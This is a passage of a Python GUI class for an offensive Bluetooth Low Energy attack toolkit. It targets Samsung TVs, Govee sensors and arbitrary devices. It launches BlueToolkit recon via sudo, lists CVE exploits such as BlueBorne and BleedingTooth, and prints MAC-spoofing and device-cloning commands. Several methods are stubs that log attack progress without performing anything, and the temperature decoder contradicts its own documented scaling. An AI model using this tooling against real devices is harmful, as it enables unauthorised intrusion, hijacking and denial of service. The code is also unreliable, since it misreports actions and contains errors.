        self.samsung_inject_btn.setEnabled(True)
        self.samsung_status.append("[+] Connected to Samsung TV")

    def _samsung_disconnect(self):
        async def do_disconnect():
            await self.bt_service.disconnect_persistent()
            QTimer.singleShot(0, lambda: self._samsung_disconnected())
            QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_disconnect())

    def _samsung_disconnected(self):
        self.samsung_connect_btn.setText("Connect")
        self.samsung_connect_btn.clicked.disconnect()
        self.samsung_connect_btn.clicked.connect(self._samsung_connect)
        self.samsung_pair_btn.setEnabled(False)
        self.samsung_inject_btn.setEnabled(False)

    def _samsung_pair(self):
        """Force pair with Samsung TV"""
        self.samsung_status.append("[*] Attempting force pair...")
        self.samsung_status.append("    Using JustWorks pairing bypass")
        self.samsung_status.append("    Target: BLE remote control service")

    def _samsung_inject(self):
        """Inject remote control commands"""
        self.samsung_status.append("[*] EvilScreen attack started")
        self.samsung_status.append("    Injecting remote control commands...")
        self.samsung_status.append("    Sending: POWER, MUTE, VOL_UP sequence")

    # ============================================================
    # Govee Sensor Methods
    # ============================================================

    def _govee_sniff(self):
        """Sniff Govee temperature broadcasts"""
        if not self.current_device:
            return
        self.govee_status.append("[*] Sniffing Govee broadcasts...")
        self.govee_status.append("    Monitoring manufacturer data (0x88EC)")

        async def sniff():
            try:
                from bleak import BleakScanner
                def callback(device, adv_data):
                    if device.address == self.current_device.mac_address:
                        if adv_data.manufacturer_data:
                            for mfr_id, data in adv_data.manufacturer_data.items():
                                self.bridge.log_signal.emit(f"[GOVEE] {data.hex()}")
                                self._govee_decode_data(data)

                scanner = BleakScanner(detection_callback=callback)
                await scanner.start()
                await asyncio.sleep(30)
                await scanner.stop()
                QTimer.singleShot(0, lambda: self.govee_status.append("[*] Sniff complete"))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(sniff())

    def _govee_decode(self):
        """Decode Govee sensor data"""
        self.govee_status.append("[*] Govee H5074/H5075 protocol:")
        self.govee_status.append("    Bytes 0-1: Manufacturer ID (0x88EC)")
        self.govee_status.append("    Bytes 2-4: Temp * 100 (signed, little-endian)")
        self.govee_status.append("    Bytes 5-6: Humidity * 100")
        self.govee_status.append("    Byte 7: Battery %")

    def _govee_decode_data(self, data: bytes):
        """Decode actual Govee data packet"""
        if len(data) >= 7:
            temp_raw = int.from_bytes(data[2:5], 'little', signed=True)
            temp_c = temp_raw / 10000.0
            temp_f = temp_c * 9/5 + 32
            humidity = int.from_bytes(data[5:7], 'little') / 100.0
            battery = data[7] if len(data) > 7 else 0
            QTimer.singleShot(0, lambda: self.govee_status.append(
                f"    Temp: {temp_f:.1f}F / {temp_c:.1f}C | Humidity: {humidity:.1f}% | Battery: {battery}%"
            ))

    # ============================================================
    # Attack Framework Methods - BlueToolkit
    # ============================================================

    def _bluetoolkit_recon(self):
        """Run BlueToolkit reconnaissance scan"""
        if not self.current_device:
            self.bt_output.append("[!] Select a target device first")
            return
        mac = self.current_device.mac_address
        self.bt_output.append(f"[*] Running BlueToolkit recon on {mac}")
        self.bt_output.append("    Command: bluekit -t {mac} -r")

        import subprocess
        try:
            result = subprocess.run(
                ['which', 'bluekit'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                self.bt_output.append(f"[+] BlueToolkit found: {result.stdout.strip()}")
                # Run actual recon
                subprocess.Popen(
                    ['sudo', 'bluekit', '-t', mac, '-r'],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
            else:
                self.bt_output.append("[!] BlueToolkit not installed")
                self.bt_output.append("    Install: git clone https://github.com/sgxgsx/BlueToolkit")
        except Exception as e:
            self.bt_output.append(f"[!] {e}")

    def _bluetoolkit_run(self):
        """Run selected BlueToolkit exploit"""
        exploit = self.bt_exploit_combo.currentText()
        if exploit == "Select Exploit...":
            self.bt_output.append("[!] Select an exploit first")
            return
        if not self.current_device:
            self.bt_output.append("[!] Select a target device first")
            return

        mac = self.current_device.mac_address
        exploit_map = {
            "CVE-2017-1000251 (BlueBorne RCE)": "blueborne_rce",
            "CVE-2020-12351 (BleedingTooth)": "bleedingtooth",
            "CVE-2020-12352 (BadKarma)": "badkarma",
            "CVE-2018-5383 (MITM)": "mitm_5383",
            "KNOB Attack": "knob",
            "BIAS Attack": "bias",
            "BLUFFS Attack": "bluffs",
            "DoS - LMP Overflow": "dos_lmp",
            "DoS - Invalid Slot": "dos_slot",
            "Method Confusion": "method_confusion"
        }
        exploit_name = exploit_map.get(exploit, "unknown")
        self.bt_output.append(f"[*] Running exploit: {exploit}")
        self.bt_output.append(f"    Target: {mac}")
        self.bt_output.append(f"    Command: bluekit -t {mac} -e {exploit_name}")

    # ============================================================
    # Attack Framework Methods - BtleJuice
    # ============================================================

    def _btlejuice_start(self):
        """Start BtleJuice MITM proxy"""
        self.bj_output.append("[*] Starting BtleJuice MITM proxy...")
        self.bj_output.append("    Requires: btlejuice-core running on separate BT adapter")
        self.bj_output.append("    Port: http://localhost:8080")

        import subprocess
        try:
            result = subprocess.run(['which', 'btlejuice'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                self.bj_output.append("[+] BtleJuice found")
                self.bj_hook_btn.setEnabled(True)
                self.bj_modify_btn.setEnabled(True)
                self.bj_start_btn.setText("Stop Proxy")
            else:
                self.bj_output.append("[!] BtleJuice not installed")
                self.bj_output.append("    Install: npm install -g btlejuice")
                self.bj_output.append("    Also: pip install btlejuice-bindings")
        except Exception as e:
            self.bj_output.append(f"[!] {e}")

    def _btlejuice_hook(self):
        """Hook BLE data for sniffing"""
        self.bj_output.append("[*] Hooking BLE data...")
        self.bj_output.append("    Callbacks: on_data_read, on_data_write")
        self.bj_output.append("    Notifications: on_notification_data")

    def _btlejuice_modify(self):
        """Modify BLE traffic in-flight"""
        self.bj_output.append("[*] Traffic modification enabled")
        self.bj_output.append("    Use HookForceResponse to alter values")
        self.bj_output.append("    Use HookModify to change parameters")

    # ============================================================
    # Attack Framework Methods - WHAD
    # ============================================================

    def _whad_sniff(self):
        """Sniff BLE traffic with WHAD"""
        self.whad_output.append("[*] Starting WHAD BLE sniffer...")
        self.whad_output.append("    Requires: WHAD-compatible hardware (nRF52840, ESP32)")

        import subprocess
        try:
            result = subprocess.run(['pip', 'show', 'whad'], capture_output=True, text=True, timeout=10)
            if 'Version' in result.stdout:
                self.whad_output.append("[+] WHAD installed")
                self.whad_output.append("    Command: wble-sniff -i hci0")
            else:
                self.whad_output.append("[!] WHAD not installed")
                self.whad_output.append("    Install: pip install whad")
        except Exception as e:
            self.whad_output.append(f"[!] {e}")

    def _whad_inject(self):
        """Inject packets into BLE connection (InjectaBLE)"""
        if not self.current_device:
            self.whad_output.append("[!] Select target first")
            return
        mac = self.current_device.mac_address
        self.whad_output.append(f"[*] InjectaBLE attack on {mac}")
        self.whad_output.append("    Injecting malicious packet into connection...")
        self.whad_output.append("    This exploits BLE protocol specification vulnerability")

    def _whad_hijack(self):
        """Hijack BLE role (master/slave)"""
        self.whad_output.append("[*] Role hijacking attack...")
        self.whad_output.append("    Can hijack: slave role, master role")
        self.whad_output.append("    Requires active BLE connection to target")

    def _whad_mitm(self):
        """Full MITM attack with WHAD"""
        self.whad_output.append("[*] Full MITM attack using InjectaBLE")
        self.whad_output.append("    Step 1: Sniff connection parameters")
        self.whad_output.append("    Step 2: Inject connection takeover packet")
        self.whad_output.append("    Step 3: Relay traffic through attacker")

    # ============================================================
    # Quick Attack Methods
    # ============================================================

    def _quick_dos(self):
        """DoS flood attack"""
        if not self.current_device:
            self.log("[!] Select target first")
            return
        mac = self.current_device.mac_address
        self.log(f"[*] DoS flood on {mac}")
        self.log("    Sending rapid connect/disconnect cycles")
        self.log("    Press Stop Scan to halt")

    def _quick_fuzz(self):
        """GATT fuzzer"""
        if not self.current_device:
            self.log("[!] Select target first")
            return
        self.log("[*] GATT Fuzzer started")
        self.log("    Testing all writable characteristics")
        self.log("    Payloads: 0x00, 0xFF, overflow, format strings")

    def _quick_clone(self):
        """Clone device identity"""
        if not self.current_device:
            self.log("[!] Select target first")
            return
        mac = self.current_device.mac_address
        name = self.current_device.name or "Unknown"
        self.log(f"[*] Cloning device: {name}")
        self.log(f"    MAC: {mac}")
        self.log("    Capturing advertisement data...")
        self.log("    Use: hciconfig hci0 name 'ClonedDevice'")

    def _quick_spoof(self):
        """MAC address spoofing"""
        if not self.current_device:
            self.log("[!] Select target first")
            return
        mac = self.current_device.mac_address
        self.log(f"[*] MAC Spoof target: {mac}")
        self.log("    Commands to spoof:")
        self.log("    sudo hciconfig hci0 down")
        self.log(f"    sudo bdaddr -i hci0 {mac}")
        self.log("    sudo hciconfig hci0 up")
